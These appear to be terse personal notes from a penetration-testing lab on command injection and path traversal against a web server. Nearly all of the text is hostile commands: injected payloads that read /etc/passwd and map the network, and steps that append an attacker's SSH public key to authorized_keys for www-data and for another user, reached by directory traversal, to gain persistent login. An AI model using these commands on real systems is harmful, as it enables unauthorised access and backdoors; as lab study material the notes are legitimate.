There will be a webserver on the ouside first.
-tricking file to read file from locations it shouldn't
- prepended path directories don't allow you to directly
- COMMAND INJECT - force site to run commands it was no designed to run
```shell
ls ; pwd 
#running below on server
 ; whoami
 ' ls the "www.html" directory
 ; cat /etc/passwd | grep www-data
 ; mkdir /var/www/.ssh
 ; ls -latr & netstat -rn
 || ifconfig
 ; mkdir /var/www/.ssh # make ssh directory in the ww-datas user folder
 ssh-keygen #this will ask o generate file. LEAVE DEFAULT
 cd .ssh
 cat id_rsa.pub # everything in this file is your ssh key
 #use ssh keys from machine to authenticate
 ; echo "RSA key" >> /var/www/.ssh/authorized_keys
 #now you can ssh in as www-data
 ssh www-data@<ip>
 ```
 ------------------------
 upload maliciouse file
 /var/www/html/uploads
 /var/www/

mkdir ../../../../../../home/billybob/.ssh
ls -shla ../../../../../../home/billybob

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDveZOWeA/wkiIal9Itl+4CV85j8lG5afCf6mCQ1NaXknhhoWjtQD1fTC2jXhTgkl5nh+54G1OzxEpuWe8a7mijkeiUWqQgIBqOvlv0Akx8Z7LUWP5cm1qx5v6DktGn2KmDucdAA+aEZk6oF6q5btPF14C2ShLDdOJT9R2V9HUciEKb9aLyZ28niIja8YWeEPl/UQWTHRijg2usXV693WwZRfvXWRWmEGz1wusNISntG+5Pk3WFg6SIeikQuVwgppjxftil2zHxlWyyZUdPC7pN1R8leXhF7Vrpw2C5xRcRxf0AFO/1JjLu9jfVaK+1+Jm6LHkuN/K0zT0qmpuT0KBr" >> ../../../../../../home/billybob/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDveZOWeA/wkiIal9Itl+4CV85j8lG5afCf6mCQ1NaXknhhoWjtQD1fTC2jXhTgkl5nh+54G1OzxEpuWe8a7mijkeiUWqQgIBqOvlv0Akx8Z7LUWP5cm1qx5v6DktGn2KmDucdAA+aEZk6oF6q5btPF14C2ShLDdOJT9R2V9HUciEKb9aLyZ28niIja8YWeEPl/UQWTHRijg2usXV693WwZRfvXWRWmEGz1wusNISntG+5Pk3WFg6SIeikQuVwgppjxftil2zHxlWyyZUdPC7pN1R8leXhF7Vrpw2C5xRcRxf0AFO/1JjLu9jfVaK+1+Jm6LHkuN/K0zT0qmpuT0KBr student@lin-ops
